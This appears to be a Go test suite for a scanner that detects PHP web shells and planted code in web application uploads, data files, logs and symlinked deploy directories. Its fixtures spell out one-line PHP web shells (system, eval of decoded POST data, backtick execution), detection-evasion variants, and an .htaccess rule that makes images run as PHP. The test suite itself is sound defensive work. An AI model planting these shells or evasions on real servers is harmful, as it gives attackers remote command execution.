	}
}

// A served site whose uploads link into another deploy's shared directory, next to releases
// linking there too: the shared uploads are scanned once, as the served site's, the real-time
// watch is given their real location, and a plugin's index.php in them is no application.
func TestSharedUploadsScannedOnceForTheServedSite(t *testing.T) {
	tr := newTree(t)
	tr.file("etc/nginx/nginx.conf", "events {} http { server { server_name www.example.test; root /var/www/site; } }")
	for _, app := range []string{"var/www/site", "var/www/deploy/releases/1", "var/www/deploy/releases/2"} {
		tr.file(app+"/wp-includes/version.php", "<?php $wp_version = '6.6';")
		tr.file(app+"/wp-content/plugins/p/p.php", "<?php echo 1;")
	}
	tr.link("../../../shared/wp-content/uploads", "var/www/deploy/releases/1/wp-content/uploads")
	tr.link("../../../shared/wp-content/uploads", "var/www/deploy/releases/2/wp-content/uploads")
	tr.link("../../deploy/shared/wp-content/uploads", "var/www/site/wp-content/uploads")
	tr.file("var/www/deploy/shared/wp-content/uploads/2026/shell.php", `<?php system($_GET['c']);`)
	tr.file("var/www/deploy/shared/wp-content/uploads/smush/index.html", "<html></html>")

	res := tr.scan()
	var where []string
	for _, a := range res.Apps {
		if strings.Contains(a.Path, "smush") {
			t.Errorf("a directory in the uploads is an application: %s", a.Path)
		}
		for _, f := range a.Findings {
			if f.Kind == KindScriptInUploads && strings.HasSuffix(f.Path, "/shell.php") {
				where = append(where, a.Path)
			}
		}
		if a.Path == "/var/www/site" && !slices.Equal(a.UploadDirs, []string{"/var/www/deploy/shared/wp-content/uploads"}) {
			t.Errorf("site upload dirs = %v", a.UploadDirs)
		}
	}
	if !slices.Equal(where, []string{"/var/www/site"}) {
		t.Errorf("shell.php reported by %v, want the served site once", where)
	}
	for _, issue := range res.Issues {
		if strings.Contains(issue, "not followed") {
			t.Errorf("issue: %s", issue)
		}
	}
}

// A release linking a script to its copy in the deploy's shared directory, wp-config.php or an
// .env kept across releases, is the deploy layout; a script linked to anything else is not.
func TestSharedScriptOfAReleaseIsNotSuspicious(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/deploy/releases/5/index.php", "<?php echo 1;")
	tr.file("var/www/deploy/releases/5/lib/app.php", "<?php echo 2;")
	tr.file("var/www/deploy/shared/wp-config.php", "<?php define('DB_NAME', 'site');")
	tr.file("var/www/deploy/shared/lib/boot.php", "<?php return [];")
	tr.file("var/www/deploy/shared/settings.php", `<?php system($_GET['c']);`)
	tr.file("var/www/deploy/shared/uploads/hook.php", "<?php return [];")
	tr.file("var/www/deploy/shared/avatar.jpg", "\xff\xd8 photo")
	tr.link("../../shared/wp-config.php", "var/www/deploy/releases/5/wp-config.php")
	tr.link("../../../shared/lib/boot.php", "var/www/deploy/releases/5/lib/boot.php")
	tr.link("../../shared/settings.php", "var/www/deploy/releases/5/settings.php")
	tr.link("../../shared/uploads/hook.php", "var/www/deploy/releases/5/hook.php")
	tr.link("../../shared/wp-config.php", "var/www/deploy/releases/5/config.php")
	tr.link("../../shared/avatar.jpg", "var/www/deploy/releases/5/avatar.php")

	got := findingsOf(tr.scan())
	for _, quiet := range []string{"/wp-config.php", "/lib/boot.php"} {
		if slices.Contains(got, KindSuspiciousSymlink+" /var/www/deploy/releases/5"+quiet) {
			t.Errorf("the shared copy %s was reported: %v", quiet, got)
		}
	}
	for _, loud := range []string{"/settings.php", "/hook.php", "/config.php", "/avatar.php"} {
		if !slices.Contains(got, KindSuspiciousSymlink+" /var/www/deploy/releases/5"+loud) {
			t.Errorf("missing the link %s: %v", loud, got)
		}
	}
}

// Upload directories are streamed: one larger than the listing limit is scanned in full.
func TestHugeUploadDirectoryIsScannedInFull(t *testing.T) {
	prev := collector.MaxDirEntries
	collector.MaxDirEntries = 50
	t.Cleanup(func() { collector.MaxDirEntries = prev })

	tr := newTree(t)
	tr.file("var/www/site/index.php", "<?php echo 1;")
	for i := range 200 {
		tr.file(fmt.Sprintf("var/www/site/uploads/img%03d.jpg", i), "\xff\xd8 photo")
	}
	tr.file("var/www/site/uploads/zz-shell.php", `<?php system($_GET['c']);`)

	if got := findingsOf(tr.scan()); !slices.Contains(got, KindScriptInUploads+" /var/www/site/uploads/zz-shell.php") {
		t.Errorf("findings = %v", got)
	}
}

// Past the run's hash budget files are fingerprinted, the scan completes, and that is said.
func TestHashBudget(t *testing.T) {
	prev := MaxHashBytesPerRun
	MaxHashBytesPerRun = 100
	t.Cleanup(func() { MaxHashBytesPerRun = prev })

	tr := newTree(t)
	tr.file("var/www/site/index.php", "<?php echo 1;")
	tr.file("var/www/site/lib/a.php", "<?php "+strings.Repeat("a", 200)+";")
	tr.file("var/www/site/lib/b.php", "<?php "+strings.Repeat("b", 200)+";")

	res := tr.scan()
	if len(res.Apps) != 1 || res.Apps[0].TreeHash == "" || res.Apps[0].Files != 3 {
		t.Fatalf("apps = %+v", res.Apps)
	}
	if !slices.ContainsFunc(res.Issues, func(s string) bool { return strings.Contains(s, "hash budget") }) {
		t.Errorf("issues = %v", res.Issues)
	}
}

func TestOverridesInUploads(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/site/index.php", "<?php echo 1;")
	tr.file("var/www/site/uploads/.htaccess", "AddType application/x-httpd-php .jpg\n")
	tr.file("var/www/site/media/.htaccess", "Options -Indexes\nAddHandler cgi-script .php .pl\nOptions -ExecCGI\nphp_flag engine 0\n")

	res := tr.scan()
	got := map[string][]string{}
	for _, f := range res.Apps[0].Findings {
		if f.Kind == KindOverrideInData {
			got[f.Path] = f.Signatures
		}
	}
	if !slices.Equal(got["/var/www/site/uploads/.htaccess"], []string{"handler_directive"}) {
		t.Errorf("executable mapping: %v", got)
	}
	if sigs, ok := got["/var/www/site/media/.htaccess"]; !ok || len(sigs) != 0 {
		t.Errorf("hardening .htaccess must be a finding without handler_directive: %v", got)
	}
}

// Laravel keeps public uploads in storage/app/public, inside the storage data directory.
func TestUploadDirectoryInsideDataDirectory(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/app/artisan", "")
	tr.file("var/www/app/bootstrap/app.php", "<?php")
	tr.file("var/www/app/public/index.php", "<?php")
	tr.file("var/www/app/storage/app/public/avatars/x.php", `<?php system($_GET['c']);`)
	tr.file("var/www/app/storage/framework/views/compiled.php", "<?php echo 1;")

	got := findingsOf(tr.scan())
	if !slices.Contains(got, KindScriptInUploads+" /var/www/app/storage/app/public/avatars/x.php") {
		t.Errorf("findings = %v", got)
	}
	if slices.ContainsFunc(got, func(f string) bool { return strings.Contains(f, "compiled.php") }) {
		t.Errorf("compiled views are data, not uploads: %v", got)
	}
}

// A link to / inside an upload directory is reported, never walked.
func TestLinksInsideUploadsAreNotFollowed(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/site/index.php", "<?php echo 1;")
	tr.file("var/www/site/uploads/a.jpg", "\xff\xd8")
	tr.file("etc/secret.php", "<?php system($_GET['c']);")
	tr.link("/", "var/www/site/uploads/everything")
	tr.file("var/www/other/index.php", "<?php echo 1;")
	tr.link("/etc", "var/www/other/uploads")

	res := tr.scan()
	got := findingsOf(res)
	for _, want := range []string{KindSuspiciousSymlink + " /var/www/site/uploads/everything", KindSuspiciousSymlink + " /var/www/other/uploads"} {
		if !slices.Contains(got, want) {
			t.Errorf("link not reported: %q in %v", want, got)
		}
	}
	if slices.ContainsFunc(got, func(f string) bool { return strings.Contains(f, "secret.php") }) {
		t.Errorf("a link out of the application was followed: %v", got)
	}
	if !slices.ContainsFunc(res.Issues, func(s string) bool { return strings.Contains(s, "not followed") }) {
		t.Errorf("issues = %v", res.Issues)
	}
}

// A code directory over the listing limit is still inspected entry by entry.
func TestHugeCodeDirectoryIsInspected(t *testing.T) {
	prev := collector.MaxDirEntries
	collector.MaxDirEntries = 50
	t.Cleanup(func() { collector.MaxDirEntries = prev })

	tr := newTree(t)
	tr.file("var/www/site/index.php", "<?php echo 1;")
	for i := range 120 {
		tr.file(fmt.Sprintf("var/www/site/lib/c%03d.php", i), "<?php class C {}")
	}
	tr.file("var/www/site/lib/zz.php", `<?php eval(base64_decode($_POST['x']));`)

	res := tr.scan()
	if got := findingsOf(res); !slices.Contains(got, KindSignature+" /var/www/site/lib/zz.php") {
		t.Errorf("findings = %v", got)
	}
}

// Scripts in upload directories are reported from the listing alone, before any content is
// read, so slow files cannot push them past the deadline.
func TestNamesPassReportsScriptsBeforeReading(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/site/index.php", "<?php echo 1;")
	for i := range 50 {
		tr.file(fmt.Sprintf("var/www/site/uploads/%02d/big.jpg", i), "\xff\xd8 photo")
	}
	tr.file("var/www/site/uploads/99/zz.php", `<?php system($_GET['c']);`)

	src := collector.NewSource(tr.root)
	inv := discovery.Inspect(src.FS)
	s := newScanner(src, inv.Applications[0], inv.Sites, inv.Applications)
	s.namesPass(context.Background())

	if len(s.report.Findings) != 1 || s.report.Findings[0].Path != "/var/www/site/uploads/99/zz.php" {
		t.Errorf("findings after the names pass = %+v", s.report.Findings)
	}
}

// A chain of links is judged by where it ends, not by the text of its first target.
func TestLinkChainOutOfTheApplication(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/site/index.php", "<?php echo 1;")
	tr.file("var/www/site/app/code/keep.php", "<?php")
	tr.file("etc/secret.php", "<?php system($_GET['c']);")
	tr.link("/", "var/www/site/app/code/x")
	tr.link("../app/code/x", "var/www/site/uploads")

	res := tr.scan()
	if got := findingsOf(res); slices.ContainsFunc(got, func(f string) bool { return strings.Contains(f, "secret.php") }) {
		t.Errorf("followed a chain of links to the host root: %v", got)
	}
	if !slices.ContainsFunc(res.Issues, func(s string) bool { return strings.Contains(s, "not followed") }) {
		t.Errorf("issues = %v", res.Issues)
	}
}

// The names pass follows an upload directory that is a link, as in release-based deploys.
func TestNamesPassFollowsLinkedUploads(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/releases/5/index.php", "<?php echo 1;")
	tr.file("var/www/shared/uploads/zz.php", `<?php system($_GET['c']);`)
	tr.link("../../shared/uploads", "var/www/releases/5/uploads")

	src := collector.NewSource(tr.root)
	inv := discovery.Inspect(src.FS)
	s := newScanner(src, inv.Applications[0], inv.Sites, inv.Applications)
	s.namesPass(context.Background())
	if len(s.report.Findings) != 1 || s.report.Findings[0].Path != "/var/www/shared/uploads/zz.php" {
		t.Errorf("findings = %+v", s.report.Findings)
	}
}

// A directory replaced by a link after the walk validated its parent is not followed.
func TestWalkRefusesDirectorySwappedForLink(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/site/index.php", "<?php echo 1;")
	tr.file("var/www/shared/up/a/x.php", "<?php")
	tr.file("etc/secret.php", "<?php system($_GET['c']);")
	tr.link("../shared/up", "var/www/site/uploads")
	src := collector.NewSource(tr.root)
	inv := discovery.Inspect(src.FS)
	s := newScanner(src, inv.Applications[0], inv.Sites, inv.Applications)

	// Swap var/www/shared/up/a for a link to / and walk it as the followed tree would.
	if err := os.RemoveAll(filepath.Join(tr.root, "var/www/shared/up/a")); err != nil {
		t.Fatal(err)
	}
	tr.link("/", "var/www/shared/up/a")
	s.walkData(context.Background(), "var/www/shared/up/a", true, true)
	for _, f := range s.report.Findings {
		if strings.Contains(f.Path, "secret.php") {
			t.Errorf("walked out through a swapped link: %+v", f)
		}
	}
	if !slices.ContainsFunc(s.issues, func(i string) bool { return strings.Contains(i, "changed during the scan") }) {
		t.Errorf("issues = %v", s.issues)
	}
}

// A small sparse script is read at the edges only, and still reported.
func TestSparseSmallFile(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/site/index.php", "<?php echo 1;")
	tr.file("var/www/site/uploads/s.php", `<?php system($_GET['c']);`)
	if err := os.Truncate(filepath.Join(tr.root, "var/www/site/uploads/s.php"), 3<<20); err != nil {
		t.Fatal(err)
	}
	if got := findingsOf(tr.scan()); !slices.Contains(got, KindScriptInUploads+" /var/www/site/uploads/s.php") {
		t.Errorf("findings = %v", got)
	}
}

// PHP saved by the application in its own data files waits for an include to run; sessions,
// logs and reports with ordinary content, logged attack attempts among them, are not code.
func TestCodeInDataFiles(t *testing.T) {
	fsys := compromisedShop()
	clean := map[string]string{
		"var/session/sess_3b1f": `_session_validator_data|a:4:{s:11:"remote_addr";s:9:"10.0.0.7";s:8:"http_via";s:0:"";` +
			`s:20:"http_x_forwarded_for";s:0:"";s:15:"http_user_agent";s:40:"Mozilla/5.0 (X11; Linux x86_64) Firefox";}` +
			`default|a:2:{s:9:"_form_key";s:16:"Xk3aP0qLm2Zt9wBv";s:12:"visitor_data";a:1:{s:10:"visitor_id";s:4:"1182";}}`,
		"var/log/exception.log": "[2026-10-24T08:13:02.112Z] main.CRITICAL: Warning: Undefined array key \"price\" in " +
			"/var/www/commerce/vendor/magento/module-catalog/Model/Product.php on line 512 {\"exception\":\"[object] (Exception(code: 0): " +
			"#0 /var/www/commerce/vendor/magento/framework/App/ErrorHandler.php(62): include()\\n#1 {main}\"} []\n",
		"var/log/support_report.log": "[2026-10-24T08:14:10Z] main.WARNING: Blocked search q=%3C%3Fphp%20system(%24_GET%5Bc%5D)%3B%3F%3E [] []\n" +
			"[2026-10-24T08:14:11Z] main.WARNING: Blocked search q=<?php+system($_GET[c]); [] []\n",
		"var/report/7731024": `{"0":"Notice: Undefined index: sku","1":"#0 \/var\/www\/commerce\/vendor\/magento\/framework\/App\/Bootstrap.php(263): ` +
			`Magento\\Framework\\App\\Http->launch()\n#1 {main}","url":"\/checkout\/","script_name":"\/index.php"}`,
		"var/export/cms_blocks.csv": `block_id,content` + "\n" + `12,"<div><?php echo $block->escapeHtml($block->getTitle()) ?></div>"`,
	}
	evil := map[string]string{
		"var/report/9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08": `{"0":"<?php system($_GET['c']); ?>","url":"\/"}`,
		"var/session/sess_9a02": "default|a:1:{s:4:\"note\";s:17:\"<?=`$_GET[c]`?>\";}",
		"var/log/debug.log":     "[2026-10-24T08:20:00Z] main.DEBUG: <?php\n@include($_COOKIE['f']); ?> [] []\n",
		"var/log/system.log": strings.Repeat("[2026-10-24T08:13:02Z] main.INFO: Broken reference: the 'header.panel' element cannot be added as child [] []\n", 8000) +
			"[2026-10-24T09:00:00Z] main.ERROR: <?php eval(base64_decode($_POST['p'])); ?> [] []\n",
	}
	for name, content := range clean {
		fsys["var/www/commerce/"+name] = text(content)
	}
	for name, content := range evil {
		fsys["var/www/commerce/"+name] = text(content)
	}
	got := map[string]string{}
	for _, f := range commerceReport(t, run(t, fsys)).Findings {
		if f.Kind == KindCodeInData {
			got[strings.TrimPrefix(f.Path, "/var/www/commerce/")] = strings.Join(f.Signatures, ",")
		}
	}
	want := map[string]string{
		"var/report/9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08": "exec_request_input",
		"var/session/sess_9a02": "backtick_request_input,backtick_exec",
		"var/log/debug.log":     "include_request_input",
		"var/log/system.log":    "eval_decoded_payload,eval_request_input",
	}
	if fmt.Sprint(got) != fmt.Sprint(want) {
		t.Errorf("code in data files:\n got  %v\n want %v", got, want)
	}
}

func BenchmarkCodeInData(b *testing.B) {
	log := []byte(strings.Repeat("[2026-10-24T08:13:02Z] main.WARNING: Blocked search q=<?php+system($_GET[c]); <?= 1 ?> [] []\n", 40000))
	b.SetBytes(int64(len(log)))
	for b.Loop() {
		codeInData(log, nil)
	}
}

// Signatures run over a corpus of clean applications (WEB_CORPUS, a directory) report nothing.
func TestSignaturesOnCleanCorpus(t *testing.T) {
	dir := os.Getenv("WEB_CORPUS")
	if dir == "" {
		t.Skip("WEB_CORPUS not set")
	}
	files := 0
	err := filepath.WalkDir(dir, func(p string, d os.DirEntry, err error) error { //nolint:gosec // a test corpus chosen by whoever runs it
		if err != nil || d.IsDir() || !isScript(strings.ToLower(d.Name())) {
			return err
		}
		data, err := os.ReadFile(p) //nolint:gosec // a test corpus chosen by whoever runs it
		if err != nil {
			return err
		}
		files++
		if sigs := matchSignatures(data, true); len(sigs) > 0 && !slices.Equal(sigs, []string{"encoded_blob"}) {
			t.Errorf("%s: %v", p, sigs)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	t.Logf("%d scripts", files)
}

func BenchmarkSignatures(b *testing.B) {
	src := []byte(strings.Repeat(`<?php $label = "Order #" . $id . ' of ' . "\x1f" . $name; $this->$method($a, 'b' . 'c');`+"\n", 20000))
	b.SetBytes(int64(len(src)))
	for b.Loop() {
		matchSignatures(src, true)
	}
}

// The ways around the search for code in data files: a "?>" PHP does not see, padding before
// the code, a command in backticks, the short open tag, code deep inside a large log.
func TestCodeInDataBypasses(t *testing.T) {
	for in, want := range map[string]string{
		"<?php /* ?> */ eval($_POST[x]);":                                            "eval_request_input",
		"<?php $s = '?>'; system($_GET['c']);":                                       "exec_request_input",
		"<?php" + strings.Repeat(" ", 17<<10) + "system($_GET[c]);":                  "exec_request_input",
		"<?php /*" + strings.Repeat("x", 17<<10) + "*/ passthru($_REQUEST['c']);":    "exec_request_input",
		"<?php echo `{$h['X-Cmd']}`; $h = getallheaders();":                          "backtick_exec",
		"<? $f = getallheaders(); $f['k'];":                                          "dangerous_call",
		"<?\n@system($_COOKIE['c']);":                                                "exec_request_input",
		"<?php // note ?> plain text, then system(1)":                                "",
		"<?xml version=\"1.0\"?><order><note>system($_GET)</note></order>":           "",
		"[2026-10-24] main.INFO: q=<?php+system($_GET[c]); [] []":                    "",
		"[2026-10-24] main.INFO: template <?php echo $block->getTitle() ?> rendered": "",
	} {
		if got := strings.Join(first(codeInData([]byte(in), nil)), ","); !strings.Contains(got, want) || (want == "" && got != "") {
			t.Errorf("%.60q: %q, want %q", in, got, want)
		}
	}

	line := "[2026-10-24T08:13:02Z] main.INFO: Broken reference: the 'header.panel' element cannot be added as child [] []\n"
	big := strings.Repeat(line, 3<<20/len(line)) + "main.ERROR: <?php\n" + strings.Repeat(" ", 100<<10) + "system($_GET['c']); ?>\n" + strings.Repeat(line, 3<<20/len(line))
	fsys := compromisedShop()
	fsys["var/www/commerce/var/log/system.log"] = text(big)
	found := false
	for _, f := range commerceReport(t, run(t, fsys)).Findings {
		found = found || (f.Kind == KindCodeInData && f.Path == "/var/www/commerce/var/log/system.log")
	}
	if !found {
		t.Error("code in the middle of a 6 MB log is not found")
	}
}

func BenchmarkCodeInDataHostile(b *testing.B) {
	for name, src := range map[string][]byte{
		"tags":     []byte(strings.Repeat("<?php ?>", 1<<17)),
		"strings":  []byte("<?php " + strings.Repeat(`'a\'b' "c\"d" `, 1<<16)),
		"comments": []byte(strings.Repeat("<?php /* x */ // y\n", 1<<15)),
		"calls":    []byte("<?php " + strings.Repeat("$_GET[a]; eval(1); ", 1<<15)),
	} {
		b.Run(name, func(b *testing.B) {
			b.SetBytes(int64(len(src)))
			for b.Loop() {
				codeInData(src, nil)
			}
		})
	}
}

func first[T, U any](t T, _ U) T { return t }

// Hostile code in data files is matched within a budget; past it the run says so.
func TestCodeInDataBudget(t *testing.T) {
	left := int64(1000)
	in := []byte(strings.Repeat("<?php $a = 1; ?>", 10) + "<?php " + strings.Repeat("$x; ", 1000) + "system($_GET[c]);")
	if _, exhausted := codeInData(in, &left); !exhausted || left < 0 {
		t.Fatalf("budget not enforced: left %d", left)
	}
}

// In a large data file the code sits far from its tag, behind a comment of 700 KB.
func TestCodeInDataFarFromItsTag(t *testing.T) {
	line := "[2026-10-24T08:13:02Z] main.INFO: Broken reference [] []\n"
	big := strings.Repeat(line, 3<<20/len(line)) + "<?php /*" + strings.Repeat("x", 700<<10) + "*/ system($_GET['c']);\n" + strings.Repeat(line, 2<<20/len(line))
	fsys := compromisedShop()
	fsys["var/www/commerce/var/log/system.log"] = text(big)
	for _, f := range commerceReport(t, run(t, fsys)).Findings {
		if f.Kind == KindCodeInData && f.Path == "/var/www/commerce/var/log/system.log" {
			return
		}
	}
	t.Error("code 700 KB from its tag in a large log is not found")
}

// Decoys that spend the code budget of a run do not hide the file behind them in silence: the
// result names what was left unsearched and the files that spent the budget.
func TestCodeSearchBudgetSpentByDecoys(t *testing.T) {
	saved := MaxDataCodeBytesPerRun
	MaxDataCodeBytesPerRun = 64 << 10
	defer func() { MaxDataCodeBytesPerRun = saved }()

	fsys := compromisedShop()
	decoy := "<?php " + strings.Repeat("$a = 1; ", 4<<10)
	for i := range 4 {
		fsys[fmt.Sprintf("var/www/commerce/var/report/a%d", i)] = text(decoy)
	}
	fsys["var/www/commerce/var/report/z"] = text("<?php system($_GET['c']);")
	res := run(t, fsys)
	cs := res.CodeSearch
	if cs == nil || !slices.Contains(cs.Unsearched, "/var/www/commerce/var/report/z") {
		t.Fatalf("code search = %+v", cs)
	}
	if len(cs.Heaviest) == 0 || !strings.HasPrefix(cs.Heaviest[0].Path, "/var/www/commerce/var/report/a") || cs.Heaviest[0].CodeBytes < 16<<10 {
		t.Errorf("heaviest = %+v", cs.Heaviest)
	}
	for i := 1; i < len(cs.Heaviest); i++ {
		if cs.Heaviest[i].CodeBytes > cs.Heaviest[i-1].CodeBytes {
			t.Errorf("heaviest not in order: %+v", cs.Heaviest)
		}
	}
	if run(t, compromisedShop()).CodeSearch != nil {
		t.Error("a run within its budget reports a code search")
	}
}

// Files a run searched and found clean are not searched again while unchanged: later runs' budget
// reaches every file the decoys held back, and a decoy rewritten with code is searched anew.
func TestCodeSearchRemembersCleanFiles(t *testing.T) {
	saved := MaxDataCodeBytesPerRun
	MaxDataCodeBytesPerRun = 64 << 10
	defer func() { MaxDataCodeBytesPerRun = saved }()

	tr := newTree(t)
	for p, f := range compromisedShop() {
		tr.file(p, string(f.Data))
	}
	decoy := "<?php " + strings.Repeat("$a = 1; ", 3<<10)
	for i := range 12 {
		tr.file(fmt.Sprintf("var/www/commerce/var/report/a%02d", i), decoy)
	}
	tr.file("var/www/commerce/var/report/z", "<?php system($_GET['c']);")
	c := &Collector{}
	collect := func() Result {
		t.Helper()
		out, err := c.Collect(context.Background(), collector.NewSource(tr.root))
		if err != nil {
			t.Fatal(err)
		}
		return out.(Result)
	}
	found := func(res Result, p string) bool {
		return slices.ContainsFunc(commerceReport(t, res).Findings, func(f Finding) bool { return f.Kind == KindCodeInData && f.Path == p })
	}
	if collect().CodeSearch == nil {
		t.Fatal("the first run is not cut short by the decoys")
	}
	var res Result
	for range 16 {
		if res = collect(); res.CodeSearch == nil {
			break
		}
	}
	if res.CodeSearch != nil || !found(res, "/var/www/commerce/var/report/z") {
		t.Fatalf("later runs never reach the hidden file: %+v", res.CodeSearch)
	}
	tr.file("var/www/commerce/var/report/a03", decoy+" system($_GET['c']);")
	if !found(collect(), "/var/www/commerce/var/report/a03") {
		t.Error("a remembered file rewritten with code is not searched again")
	}
}

// A PDF or an archive in a data directory keeps only the named signatures: its compressed
// streams hold an open tag and a backtick by chance, while planted code is named.
func TestCodeInDocuments(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/blog/wp-includes/version.php", "<?php $wp_version = '6.6';")
	tr.file("var/www/blog/wp-content/uploads/2026/offer.pdf", "%PDF-1.7\n<? Ej4`x9 ?>\nendobj")
	tr.file("var/www/blog/wp-content/uploads/2026/planted.pdf", "%PDF-1.7\n<?php system($_GET['c']); ?>")
	tr.file("var/www/blog/wp-content/uploads/2026/notes.txt", "log <? `ls -la` ?>")
	got := findingsOf(tr.scan())
	for _, want := range []string{KindCodeInUploads + " /var/www/blog/wp-content/uploads/2026/planted.pdf", KindCodeInData + " /var/www/blog/wp-content/uploads/2026/notes.txt"} {
		if !slices.Contains(got, want) {
			t.Errorf("missing %q in %v", want, got)
		}
	}
	if slices.Contains(got, KindCodeInData+" /var/www/blog/wp-content/uploads/2026/offer.pdf") {
		t.Errorf("a backtick in a PDF is code: %v", got)
	}
}

// Drupal compiles its Twig templates into PHP under its public files and ships hidden PHP of its
// own: neither is a finding, a script of another shape at the same place is.
func TestDrupalGeneratedAndShippedFiles(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/site/web/core/lib/Drupal.php", "<?php class Drupal { const VERSION = '10.3.1'; }")
	tr.file("var/www/site/web/.ht.router.php", "<?php // router for the built-in server")
	tr.file("var/www/site/web/core/.phpstan-baseline.php", "<?php return [];")
	tr.file("var/www/site/web/core/tests/Drupal/fixtures/assets/.hidden.php", "<?php")
	twig := "<?php\n\nuse Twig\\Environment;\nuse Twig\\Source;\n\nclass __TwigTemplate_3f extends Template {}"
	tr.file("var/www/site/web/sites/default/files/php/twig/69f05ec6897ae_node.html.twig_x/abc.php", twig)
	tr.file("var/www/site/web/sites/default/files/php/twig/69f05ec6897ae_node.html.twig_x/shell.php", `<?php system($_GET['c']);`)
	got := findingsOf(tr.scan())
	want := []string{KindScriptInUploads + " /var/www/site/web/sites/default/files/php/twig/69f05ec6897ae_node.html.twig_x/shell.php"}
	var scripts []string
	for _, f := range got {
		if strings.HasPrefix(f, KindScriptInUploads) || strings.HasPrefix(f, KindHiddenScript) {
			scripts = append(scripts, f)
		}
	}
	if !slices.Equal(scripts, want) {
		t.Errorf("findings = %v, want %v", scripts, want)
	}
}
